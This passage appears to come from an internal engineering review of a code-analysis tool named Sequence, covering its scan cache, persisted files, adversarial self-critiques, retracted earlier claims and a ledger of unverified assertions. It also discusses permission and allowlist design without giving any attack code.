`export const DEFAULT_MAX_CARDS = 24;`, applied at `:767`; overflow keeps 23 real cards plus a
"+N more" (`:820`, `mergedCards.slice(0, maxCards - 1)`); sub-lists are sliced too (`:530`, `:796`,
`:841`). Paint cost is flat regardless of graph size, so three graphs is a scan-and-memory question,
not a rendering one. **This claim survives intact.**

| | 1 graph | 3 graphs |
|---|---|---|
| scan time | 4.1 s cold | ~12 s cold, **~4.1 s + 2 cache hits warm** |
| memory / JSON | ~1.4 MB | **~4.2 MB** (corrected) |
| scanned nodes | 1318 | ~3954 |
| rendered cards | ≤24 | ≤24 |

### The cache — it already existed, and the CLI now uses it

`packages/analyzer/src/server/graphCache.ts:10,25-26,44` — a stat-only signature over the file set,
persisted to `<repo>/.sequence/graph.json`, `.sequence/` self-skipped. The CLI is wired to it at
`cli.ts:8,181,196` (`noCache ? scanRepo : scanRepoCached`). Measured 2026-08-19: **cold 4.4 s → warm
0.1 s = 44×**, better than the 10.4× recorded on 2026-08-18.

**Two caveats the old version did not carry.**

- **The signature is mtime+size only** (`graphCache.ts:95` — `` `${rel}\0${st.mtimeMs}\0${st.size}` ``),
  so any writer that touches mtime without changing bytes invalidates it: a branch switch, an
  install, a formatter no-op, a cloud-sync writeback. Observed twice: a first "warm" run cost 4.2 s
  and produced a byte-identical graph. This repo lives under OneDrive. **UNVERIFIED whether OneDrive
  is the cause** — do not assume "warm scan is fast" in any user-facing argument until it is tested
  off a synced drive.
- **There is no incremental path.** `rg -in "incremental" packages/analyzer/src` → 0 hits. One
  changed byte ⇒ full rescan of 1,265 files ⇒ ~4.1 s. For an *editing* agent this is decisive: after
  a write, either reason from a stale graph or pay 4.1 s.

### Persistence — corrected

The old list of `.sequence/` subdirectories was wrong. `store.ts:71,83,85,95,249` define
`annotations.json`, `board.json`, `chat-memory.json`, `ai.json`, `agents.json` as **files**, not
directories. Real directories: `sessions/` (`store.ts:87`), `policies/` (`:112`), `programs/`.
**`.sequence/adr/` is a retired path** — `packages/web/src/canvas/serviceAdrContent.ts:196` states
*"`.sequence/decisions/` — NOT `.sequence/adr/`"*, locked by `ServiceAdrModal.test.ts:202`. Chat
turns persist to `.sequence/sessions/<id>/chat.json` (`sessionsStore.ts:43,153,161,211,257`;
`repoServer.ts:1404`) — **confirmed**.

*Note for whoever does the multi-graph UI:* a first attempt added a second cache module which
silently wrote into the analyzer's tracked test fixtures and turned a second fixture scan into a
cache hit, which would have stopped the suite exercising the scanner. Two caches over one artefact
is how they drift apart. Use `graphCache.ts`.

---

## 6 · The adversarial passes — where they landed, where they failed

Three passes were written specifically to refute the standing thesis. Recording them honestly is
the point of the exercise.

### 6.1 LANDED — "the gap is not agency, it is retrieval, verification and context handling"

**Accepted; it changed the conclusion of this document.** The attack's counterfactual is testable
and it wins: set `MAX_ASK_TOOL_ROUNDS` to 1000 and let `propose_files` write directly to disk, and
nothing improves — because the verifier still cannot spawn, the digest still carries 300 of 2309
edges, and the loop still forgets round 1 by round 3. **The build order the old thesis implied
(raise the cap, widen the write path) is exactly inverted.** §2, §3 and §4 are rewritten around this.

The attack also self-corrected one of its own numbers mid-pass — it initially claimed the digest
carries only 16.3% of file paths, then found `explain.ts:817-821` emits `digestModules[].fileIds`
uncapped and withdrew the claim. That discipline is why the edge number is trusted.

### 6.2 LANDED — "the ArchGraph is not a structural advantage as shipped"

**Accepted, with the concession stated in §1.3.** The attack conceded that transitive properties
(5 import cycles, 2 ms) are genuinely irreplaceable — and then showed every delivery path discards
them: the service-level projection (`explain.ts:870`) yields 10 nodes and 2 edges, both false;
`MAX_EDGES = 300` would not carry them anyway; `MAX_HITS_PER_DIRECTION = 40` (`graphQuery.ts:173`)
truncates `who_calls` to 51% recall; and the ask loop has no graph tool at all
(`askTools.ts:53-61`). **The moat is a real asset with no exposed surface.** The old version's
"the grounded graph is the moat, and it is real" is retained only in the corrected form in §1.3.

### 6.3 LANDED (partially) — "every proposed fix is downstream of the Windows spawn"

**Accepted.** The verify-lane's own headline ("1 of 8 project types") is 1 of 8 on macOS/Linux and
**0 of 8 on Windows**, because npm/pnpm/yarn are all `.cmd` shims. Independently reproduced here
(§1.1). This reordered §3: the spawn fix moved from a footnote to step 1 of the first PR.

The same pass also killed the security objection that had been blocking the repo-derived allowlist.
`verify-gate-scope.test.ts:32-37` refuses to widen because *"widening what commands may execute is a
security boundary"* — but `call_mcp` is in the allowlist in **every** job mode, its config is a repo
file (`mcpClient.ts:104-125`), and `:257-261` spawns an arbitrary binary with arbitrary argv and an
env overlay, with no character check. **A design that already spawns arbitrary repo-named binaries
cannot coherently refuse to spawn `npm test`.** (`.sequence/mcp.json` does not exist here, so the
capability is unused on this repo — but the code path is live and the precedent is decisive.)

### 6.4 FAILED — "the write boundary is a defect"

**Defeated, by three independent sources in the repo** (§2.1): ADR-005:39-40, `overwriteConsent.ts:27-30`,
`reviewLoop.ts:31`. The attacker conceded and did not try to argue it away. **The write boundary is
a stance and it stays.** What survives from the attack is the narrower point that four of the five
costs attributed to it (§2.2) are silent failures rather than consent, and those are defects.

### 6.5 FAILED — "the comparison is a category error, so the question dissolves"

**Held lightly, and rightly.** Sequence is an MCP server and a potential ACP orchestrator; Codex and
Claude Code are MCP clients. But the orchestration path is dead wiring (§2.3): 6 of 10 tool kinds
denied, no injection site, no approval UI, no test, and `sessionKey` never sent so every step is a
cold subprocess. **It refutes the framing of the question; it does not currently deliver a product.**

---

## 7 · Retractions — claims in the previous version that do not reproduce

Listed rather than deleted, because three of them were cited forward into commit messages and test
docblocks.

| Claim | Where | Status |
|---|---|---|
| "85 typed edges" | old `v32:17`, `:131` | **FALSE.** 2309 (2301 import + 8 interaction). Never 85 on this repo |
| "0.47 MB graph" | old `v32:15`, `:35`, `:170` | **FALSE.** 1.10 MB compact / 1.42 MB indented. Also still wrong in `packages/mcp/src/graphQuery.ts:12-13` and `packages/mcp/src/index.ts:248`, which contradict `index.ts:331-332` ("~1.1MB") **inside the same package** |
| "~1.4 MB for three graphs" | old `v32:35` | **FALSE.** ~4.2 MB; 1.4 MB is one graph |
| "4.6 KB instead of 470 KB" and the `who_calls orders` demo | old `v32:177-188` | **FALSE, and run on a different repo.** That output is from the shopfront fixture with the prefix stripped. On this monorepo `who_calls orders` resolves a file named `orders.ts` and answers ~245 bytes of nothing. The direction of the argument survives and is stronger than claimed (targeted answer ≪ blob), but the numbers are not this repo's |
| "capped at exactly one proposal per turn" | old `v32:216-218` | **FALSE as stated.** No code counts proposals; `askPipeline.ts:294-321` iterates every request in every round. The *conclusion* (the loop terminates at a human) is right; the *mechanism* is that nothing writes, not a count. The same sentence is in commit `372d9fb7` and in `verify-gate-scope.test.ts:15` — **fix that docblock** |
| "It is not behind on model quality or UI" | old `v32:108-109` | **FALSE.** 17 waves / 72–84 person-days in `GRAPHITE-MIGRATION-PLAN.md`, five carrying the owner's own words; plus 2,078 lines of `board.css` on zero paint paths (§1.4) |
| "Multi-file refactor — missing surface; there is no review-and-apply-across-files flow" | old `v32:143` | **FALSE.** One Accept applies the whole batch: `FileEditProposalBar.tsx:39-45` lists every path, `:66-74` accepts, `productStore.ts:569-611` → `applyMultiFile.ts:114-116` writes all of them |
| "no loop — it can run, not iterate" | old `v32:117` | **Imprecise.** There is a real `for(;;)` at `askPipeline.ts:274` capped at 3 rounds. It iterates; it does not compound |
| `.sequence/{adr,annotations,board,chat-memory,ai}/` as directories | old `v32:59-60` | **Inaccurate** — those are files; `adr/` is explicitly retired (§5) |
| "three references repo-wide, all inside `verifyGate.ts`" | old `v32:233-234` | **Stale by one commit** — now six, the test that documents it added three |
| Internal contradiction: lines 45–76 recommend building a scan cache that lines 78–102 prove already existed | old `v32` | **Repaired** — §5 now states the cache exists once |

Claims from the previous version that **survive re-measurement unchanged**: the 24-card board cap;
`propose_files` never writes; `VERIFY_COMMAND_ALLOWLIST` is 4 hardcoded entries with no override;
eight ordinary verify commands are refused; the safety check is independent of the allowlist; the
provider returns full text in one shot; no headless ask; no PR flow; the scan cache is real; the MCP
server already existed (7 tools then, 8 now).

---

## 8 · UNVERIFIED ledger

Things this document asserts without proof, marked so nobody builds on them:

- **All Codex and Claude Code product behaviour.** Sourced to first-party docs fetched by the survey
  lanes on 2026-08-19 and cited by URL in §1.2; **not re-fetched by this document's author**. Several
  competitor pages were read through a summarising fetch rather than raw HTML, so quote-level wording
  is high-but-not-perfect confidence; the *facts* are sourced. Specifically unverified even by the
  lanes: Codex cloud task max duration and concurrent-task cap; the `AGENTS.md` 32 KiB size cap;
  whether Codex cloud opens a PR automatically or only on request (first-party wording conflicts with
  secondary sources).
- **Person-day estimates in §3.** Author's estimates, not measured.
- **Whether OneDrive causes the spurious cache misses in §5.** The stat-only signature makes any
  mtime writer sufficient; the writer was not isolated.
- **`mvn.cmd` / `gradle.bat` / `go.exe` / `cargo.exe` / `pytest.exe` behaviour under `shell:false`.**
  Not installed on this machine. The `.exe` works / `.cmd` fails rule is measured for npm, pnpm,
  node and git only; the rest is extrapolation from the same mechanism.
- **Whether `pnpm -r build` completes inside any sane ask-loop timeout.** Reasoned from a 9-package
  monorepo, not timed. Both build entries in the allowlist are likely dead even after the spawn fix.
- **Whether `claude-code-acp` / `gemini` request permission for every edit under default flags.** If
  they do not, `defaultPermissionPolicy` is not the only thing standing between an ACP agent and the
  repo. A user can pass arbitrary `args` via `sequence agent add` (`agentsStore.ts:28,53-55`), which
  routes around the policy entirely.
- **Whether `scan_repo` and `who_calls` use the cached scan through the MCP transport.** The CLI
  cache path is confirmed; the MCP path was not re-run through stdio.
- **The digest edge ordering's stability across scans.** Measured once, against `.sequence/graph.json`
  as it stands. `analyzer`-first may be incidental to this cache file — though the ranking fix in
  §3.1 makes the question moot.
- **No lane ran the application.** Every interaction count and prompt-size figure is read off the
  components, handlers and the `buildDigest`/`buildAskPrompt` code path in `packages/analyzer/dist`,
  not observed in a live session.
